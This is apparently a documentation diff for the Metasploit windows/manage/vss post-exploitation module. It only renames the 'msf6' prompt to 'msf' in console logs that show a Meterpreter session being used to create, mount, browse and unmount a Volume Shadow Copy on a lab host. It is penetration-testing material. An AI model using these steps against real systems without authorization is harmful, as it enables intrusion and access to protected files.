@@ -36,11 +36,11 @@ Volume to make a copy of.
 First, ensure the session is running with elevated privileges and that UAC is not restricting it.
 
 ```
-msf6 post(windows/manage/vss) > 
+msf post(windows/manage/vss) > 
 [*] Sending stage (200262 bytes) to 192.168.159.30
 [*] Meterpreter session 2 opened (192.168.159.128:4444 -> 192.168.159.30:62600) at 2021-01-04 12:09:59 -0500
 
-msf6 post(windows/manage/vss) > sessions -i -1
+msf post(windows/manage/vss) > sessions -i -1
 [*] Starting interaction with 2...
 
 meterpreter > getuid
@@ -63,7 +63,7 @@ Next, use the VSS module to the storage information and then create a shadow cop
 value).
 
 ```
-msf6 post(windows/manage/vss) > vss_get_info 
+msf post(windows/manage/vss) > vss_get_info 
 
 [*] Volume Shadow Copy service is running.
 [*] Software Shadow Copy service not running. Starting it now...
@@ -78,22 +78,22 @@ msf6 post(windows/manage/vss) > vss_get_info
   UsedSpace       
 
 [*] Post module execution completed
-msf6 post(windows/manage/vss) > set ACTION VSS_CREATE 
+msf post(windows/manage/vss) > set ACTION VSS_CREATE 
 ACTION => VSS_CREATE
-msf6 post(windows/manage/vss) > run
+msf post(windows/manage/vss) > run
 
 [*] Volume Shadow Copy service is running.
 [*] Software Shadow Copy service is running.
 [*] ShadowCopy created successfully
 [+] Shadow Copy "{A38B3122-4D7A-4B93-B31B-D1454C2FED4D}" created!
 [*] Post module execution completed
-msf6 post(windows/manage/vss) >
+msf post(windows/manage/vss) >
 ```
 
 After creating the shadow copy, list the copies to get the `DeviceObject` path and mount it.
 
 ```
-msf6 post(windows/manage/vss) > vss_list_copies 
+msf post(windows/manage/vss) > vss_list_copies 
 
 [*] Volume Shadow Copy service is running.
 [*] Software Shadow Copy service is running.
@@ -127,24 +127,24 @@ msf6 post(windows/manage/vss) > vss_list_copies
   VolumeName           \\?\Volume{a5e97ffa-0120-4d03-ad47-18a94e9bfb2b}\
 
 [*] Post module execution completed
-msf6 post(windows/manage/vss) > set ACTION VSS_MOUNT 
+msf post(windows/manage/vss) > set ACTION VSS_MOUNT 
 ACTION => VSS_MOUNT
-msf6 post(windows/manage/vss) > set DEVICE \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\
+msf post(windows/manage/vss) > set DEVICE \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\
 DEVICE => \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
-msf6 post(windows/manage/vss) > run
+msf post(windows/manage/vss) > run
 
 [*] Volume Shadow Copy service is running.
 [*] Software Shadow Copy service is running.
 [*] Creating the symlink...
 [+] Mounted successfully
 [*] Post module execution completed
-msf6 post(windows/manage/vss) >
+msf post(windows/manage/vss) >
 ```
 
 Finally, interact with the session to access the mounted directory before unmounting it.
 
 ```
-msf6 post(windows/manage/vss) > sessions -i -1
+msf post(windows/manage/vss) > sessions -i -1
 [*] Starting interaction with 2...
 
 meterpreter > dir ShadowCopy 
@@ -168,11 +168,11 @@ Mode              Size        Type  Last modified              Name
 
 meterpreter > background 
 [*] Backgrounding session 2...
-msf6 post(windows/manage/vss) > vss_unmount 
+msf post(windows/manage/vss) > vss_unmount 
 
 [*] Volume Shadow Copy service is running.
 [*] Software Shadow Copy service is running.
 [*] Deleting the symlink...
 [*] Post module execution completed
-msf6 post(windows/manage/vss) >
+msf post(windows/manage/vss) >
 ```
